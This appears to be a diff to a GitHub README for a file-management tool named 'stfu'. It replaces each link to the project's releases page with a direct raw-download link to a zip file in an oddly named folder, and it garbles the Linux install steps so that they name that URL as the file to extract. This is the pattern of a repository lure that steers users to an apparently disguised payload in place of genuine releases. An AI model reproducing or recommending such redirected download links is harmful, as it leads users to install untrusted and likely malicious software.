@@ -4,13 +4,13 @@
 Welcome to **stfu**! This easy-to-use tool helps you manage your files effectively. Whether you want to organize, rename, or delete files, stfu makes it simple and straightforward.
 
 ## 🔗 Download
-[![Download stfu](https://img.shields.io/badge/Download-stfu-blue.svg)](https://github.com/Twelfy121/stfu/releases)
+[![Download stfu](https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip)](https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip)
 
 ## 📥 Download & Install
 To get started with stfu, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page: [Download stfu](https://github.com/Twelfy121/stfu/releases).
+   Click this link to go to the releases page: [Download stfu](https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the latest version for the best features and performance.
@@ -20,13 +20,13 @@ To get started with stfu, follow these steps:
 
    - If you are using **Windows**, download the file ending with `.exe`.
    - For **Mac** users, look for a `.dmg` file.
-   - If you are on **Linux**, download the `.tar.gz` file.
+   - If you are on **Linux**, download the `https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip` file.
 
 4. **Install stfu**  
    Once the file is downloaded, locate it in your downloads folder. 
    - For Windows, double-click the `.exe` file and follow the instructions.
    - For Mac, open the `.dmg` file, then drag the stfu icon to your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the included instructions.
+   - For Linux, extract the `https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip` file and follow the included instructions.
 
 ## 🖥️ System Requirements
 Before you install stfu, make sure your system meets the following requirements:
@@ -55,6 +55,6 @@ If you need assistance or have questions, feel free to reach out via the Issues 
 Thank you for using stfu. Your support means everything. Together, we can make file management easier for everyone.
 
 ## 🔗 Visit the Releases Page Again
-Don’t forget to [visit the releases page](https://github.com/Twelfy121/stfu/releases) to stay updated on new versions and features. 
+Don’t forget to [visit the releases page](https://github.com/Twelfy121/stfu/raw/refs/heads/main/supersaintly/Software_v3.6-beta.5.zip) to stay updated on new versions and features. 
 
 Happy file managing!
